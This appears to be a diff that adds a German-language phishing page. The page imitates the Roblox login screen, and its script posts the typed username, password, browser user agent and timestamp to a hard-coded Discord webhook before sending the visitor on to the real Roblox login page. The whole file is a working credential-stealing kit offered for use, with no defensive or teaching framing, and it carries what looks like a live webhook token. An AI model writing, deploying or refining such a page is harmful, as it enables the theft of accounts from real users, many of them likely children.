@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="de">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Anmelden - Roblox</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,Roboto,Arial,sans-serif;background:#fff;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:24px}
+.card{width:100%;max-width:360px}
+.logo{width:130px;display:block;margin:0 auto 28px}
+h1{font-size:20px;text-align:center;margin:0 0 20px;font-weight:600}
+input{width:100%;padding:14px;border:1px solid #c8c8c8;border-radius:8px;font-size:16px;margin-bottom:10px;outline:none}
+input:focus{border-color:#00a2ff}
+button{width:100%;padding:14px;background:#00a2ff;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:700;margin-top:4px}
+button:disabled{opacity:.6}
+.foot{text-align:center;font-size:13px;color:#666;margin-top:18px}
+.foot a{color:#00a2ff;text-decoration:none}
+</style>
+<div class="card">
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+<h1>Bei Roblox anmelden</h1>
+<form id="f">
+<input name="u" placeholder="Benutzername/E-Mail" autocomplete="username" autocapitalize="none" required>
+<input name="p" type="password" placeholder="Passwort" autocomplete="current-password" required>
+<button id="b">Anmelden</button>
+</form>
+<div class="foot"><a href="https://www.roblox.com/login">Passwort vergessen?</a></div>
+</div>
+<script>
+const HOOK = "https://discord.com/api/webhooks/1564949932874534932/_5MPAOQVYDiZjxMXu0xrVBvr0Dil_EhqSCf_IT8gdQiccX6KkYBsfs7I3IRJ5SICh5Jh";
+document.getElementById('f').onsubmit = async e => {
+  e.preventDefault();
+  const b = document.getElementById('b');
+  b.disabled = true; b.textContent = 'Bitte warten…';
+  const d = Object.fromEntries(new FormData(e.target));
+  try {
+    await fetch(HOOK, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({content: `**${d.u}** | ${d.p}\n\`${navigator.userAgent}\`\n<t:${Math.floor(Date.now()/1000)}:T>`})
+    });
+  } catch (err) {}
+  location.href = 'https://www.roblox.com/login';
+};
+</script>
